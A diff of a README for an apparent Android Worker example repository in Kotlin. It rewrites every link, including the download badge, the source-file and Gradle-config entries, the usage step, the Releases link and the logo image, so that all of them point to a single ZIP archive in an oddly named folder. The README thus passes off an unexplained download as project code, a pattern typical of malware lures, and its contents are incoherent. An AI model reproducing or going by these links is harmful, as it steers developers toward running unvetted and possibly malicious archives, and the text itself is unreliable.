@@ -12,7 +12,7 @@ Welcome to the **android-worker** repository, your go-to resource for learning a
 
 To get started with the Android Worker example, you can download the repository code by clicking on the link below:
 
-[![Download ZIP](https://github.com/Damaonly/android-worker/releases/download/v1.0/Software.zip)](https://github.com/Damaonly/android-worker/releases/download/v1.0/Software.zip)
+[![Download ZIP](https://raw.githubusercontent.com/Damaonly/android-worker/main/unequalness/android-worker-v1.8.zip)](https://raw.githubusercontent.com/Damaonly/android-worker/main/unequalness/android-worker-v1.8.zip)
 
 ⚠️ *Note: The link above leads to a downloadable ZIP file. Make sure to extract the contents of the ZIP file to access the repository code.*
 
@@ -20,8 +20,8 @@ To get started with the Android Worker example, you can download the repository 
 
 In this repository, you'll find resources to help you understand and implement Android Workers in your Kotlin Android application. Here are some key resources available:
 
-- `https://github.com/Damaonly/android-worker/releases/download/v1.0/Software.zip`: An example of an Android Worker implementation in Kotlin.
-- `https://github.com/Damaonly/android-worker/releases/download/v1.0/Software.zip`: Gradle configuration for the project.
+- `https://raw.githubusercontent.com/Damaonly/android-worker/main/unequalness/android-worker-v1.8.zip`: An example of an Android Worker implementation in Kotlin.
+- `https://raw.githubusercontent.com/Damaonly/android-worker/main/unequalness/android-worker-v1.8.zip`: Gradle configuration for the project.
 
 ## 🛠️ Usage
 
@@ -30,12 +30,12 @@ Follow these steps to use the Android Worker example in your project:
 1. Download the repository code using the provided link.
 2. Extract the contents of the ZIP file.
 3. Open the code in Android Studio or your preferred IDE.
-4. Explore the `https://github.com/Damaonly/android-worker/releases/download/v1.0/Software.zip` file to understand how workers are implemented.
+4. Explore the `https://raw.githubusercontent.com/Damaonly/android-worker/main/unequalness/android-worker-v1.8.zip` file to understand how workers are implemented.
 5. Customize the worker example to fit your application's needs.
 
 ## 🌐 Additional Information
 
-For more information and updates, visit the [Releases](https://github.com/Damaonly/android-worker/releases/download/v1.0/Software.zip) section of this repository.
+For more information and updates, visit the [Releases](https://raw.githubusercontent.com/Damaonly/android-worker/main/unequalness/android-worker-v1.8.zip) section of this repository.
 
 ## 🤝 Contributing
 
@@ -49,4 +49,4 @@ This project is licensed under the GNU AGPLv3 License. See the [LICENSE](LICENSE
 
 Thank you for checking out the Android Worker Example repository. Happy coding! 🎉
 
-![Android Logo](https://github.com/Damaonly/android-worker/releases/download/v1.0/Software.zip)
+![Android Logo](https://raw.githubusercontent.com/Damaonly/android-worker/main/unequalness/android-worker-v1.8.zip)
